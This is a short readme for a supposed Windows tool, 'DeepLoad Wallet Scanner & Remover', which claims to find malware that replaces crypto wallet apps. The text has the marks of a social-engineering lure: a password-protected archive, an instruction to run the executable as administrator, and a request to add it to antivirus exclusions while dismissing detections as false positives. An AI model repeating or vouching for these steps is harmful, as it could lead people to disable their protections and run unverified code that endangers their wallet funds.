====================================================
DeepLoad Wallet Scanner & Remover v1.0
====================================================

Password: deepload2026

FILES INCLUDED:
- DeepLoadScanner.exe (main scanner)
- wallet_hashes.db (database of official wallet hashes)
- readme.txt (this file)

WHAT THIS TOOL DOES:
Scans your Windows system for DeepLoad malware – a new threat that replaces 7 popular crypto wallets (Ledger, Trezor, Exodus, Guarda, BitBox, KeepKey, Atomic) with fake versions that steal your seed phrases.

HOW TO USE:
1. Extract to any folder.
2. Run DeepLoadScanner.exe AS ADMINISTRATOR.
3. Click "Start Scan" (or follow menu).
4. If threats found, follow removal prompts.

FEATURES:
- Process scanning for fake wallet executables
- File integrity check (SHA-256 vs official hashes)
- Registry persistence detection
- Quarantine and removal

REQUIREMENTS:
- Windows 10/11

NOTE: Antivirus may false-positive – it's safe. Add to exclusions.

For updates and support:
https://github.com/almainthesnow/deepload-wallet-scanner-remover

Stay safe from wallet replacement attacks.
